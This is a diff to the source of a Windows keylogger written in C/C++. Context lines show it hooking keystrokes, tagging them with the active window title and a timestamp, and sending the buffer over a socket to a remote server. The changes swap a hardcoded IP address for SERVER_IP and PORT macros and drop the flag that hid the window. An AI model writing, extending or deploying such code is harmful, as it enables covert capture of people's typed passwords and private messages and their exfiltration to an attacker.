@@ -1,3 +1,4 @@
+#include <winsock2.h>
 
 #include <Windows.h>
 #include <stdio.h>
@@ -9,10 +10,7 @@
 #include <iostream>
 
 // defines whether the window is visible or not
-// should be solved with makefile, not in this file
-#define invisible  // (visible / invisible)
 #define BUFFERSIZE 1000
-#define IPADDRESS "192.168.0.112"
 
 // variable to store the HANDLE to the hook. Don't declare it anywhere else then
 // globally or you will get problems since every function uses this variable.
@@ -101,7 +99,7 @@ int Save(int key_stroke)
             char s[64];
             strftime(s, sizeof(s), "%c", tm);
 
-            
+
             strcat(message, "[Window: ");
             strcat(message, window_title);
             strcat(message, " - at ");
@@ -173,12 +171,12 @@ int Save(int key_stroke)
             //有按Shift
             key = KeyMapping(key);
         }
-        
-        
+
+
         char buf[2] = {key, 0x00};
         strcat(message, buf);
     }
-    
+
     if(strlen(message) > BUFFERSIZE - 50){
         send(sockfd, message, BUFFERSIZE, 0);
         strcpy(message, "");
@@ -212,7 +210,7 @@ char KeyMapping(char key){
         {'/', '?'}
     };
 
-    
+
     for(int i = 0; i < 20; i++){
         if(key == keymap[i][0]){
             return keymap[i][1];
@@ -241,8 +239,8 @@ int ServerConnect(SOCKET &sockfd)
     WSADATA wsadata;
 
     address.sin_family = AF_INET;
-    address.sin_addr.s_addr = inet_addr(IPADDRESS);
-    address.sin_port = 80;
+    address.sin_addr.s_addr = inet_addr(SERVER_IP);
+    address.sin_port = PORT;
     len = sizeof(address);
 
     if (WSAStartup(0x101, (LPWSADATA) &wsadata) != 0) {
